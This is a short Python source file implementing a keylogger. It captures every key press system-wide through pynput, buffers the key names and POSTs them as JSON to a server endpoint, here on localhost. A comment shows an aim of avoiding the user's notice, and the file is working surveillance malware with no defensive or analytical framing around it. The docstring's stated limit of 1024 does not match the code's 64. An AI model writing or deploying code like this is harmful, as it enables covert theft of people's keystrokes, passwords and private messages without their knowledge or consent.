from typing import List, Final, Dict, Optional, Union
import json
import requests
from pynput import keyboard  # type: ignore
from pynput.keyboard import Key, KeyCode  # type: ignore

# Maximum number of keys to save, keep low to avoid memory issues
# that could warrant concern from user
SAVED_KEYS_LIMIT: Final[int] = 64


class Keylogger:
    """
    Logs keyboard events by their names at a lot limit of 1024 then sends logged keys
    to server as JSON.

    Example
    -------

    {"keys_pressed": ["shift", "space", ...] }
    """

    _keys_pressed: List[str] = []
    _pressed: Optional[str] = None

    def log_key(self, key: Union[Key, KeyCode]):
        """
        Logs keyboard event

        Paramters
        ---------

        event: Union[Key, KeyCode]
             Event to log
        """
        try:
            if self._pressed != key.char:
                self._pressed = key.char
                self._keys_pressed.append(key.char)
        except AttributeError:
            if self._pressed != key.name:
                self._pressed = key.name
                self._keys_pressed.append(key.name)

        if len(self._keys_pressed) >= SAVED_KEYS_LIMIT:
            url = "http://127.0.0.1:5000/keylogger/send_data"
            response: dict = requests.post(url, json=self._to_json())
            self._keys_pressed.clear()

    def _to_json(self) -> str:
        """
        Converts the current object to JSON

        Returns
        -------

        str
             Object represented as JSON
             { "keys_pressed": ["shift", "space", ...] }
        """
        keys_json: Dict[str, List[str]] = {"keys_pressed": self._keys_pressed}
        return json.dumps(keys_json)


def start_logger():
    """
    Main entry point to start Keylogger
    """
    keylogger = Keylogger()
    with keyboard.Listener(on_press=keylogger.log_key) as listener:
        listener.join()


if __name__ == "__main__":
    start_logger()
